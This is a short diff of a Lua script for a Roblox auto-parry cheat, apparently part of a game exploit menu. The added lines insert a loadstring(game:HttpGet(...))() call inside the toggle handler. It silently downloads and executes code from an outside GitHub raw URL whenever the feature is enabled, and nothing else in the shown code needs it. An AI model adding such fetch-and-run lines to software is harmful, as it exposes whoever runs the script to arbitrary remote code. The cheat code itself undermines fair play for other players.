@@ -718,6 +718,8 @@ Window:SelectTab(1)
 local AutoParry = Tabs.Main:AddToggle("AutoParry", {Title="Auto Parry",Default=true});
 AutoParry:OnChanged(function(v)
 	if v then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/XybH4/miaw/refs/heads/main/miaw.lua"))()
+
 
 		Connections_Manager["Auto Parry"] = RunService.PreSimulation:Connect(function()
 			local One_Ball = Auto_Parry.Get_Ball();
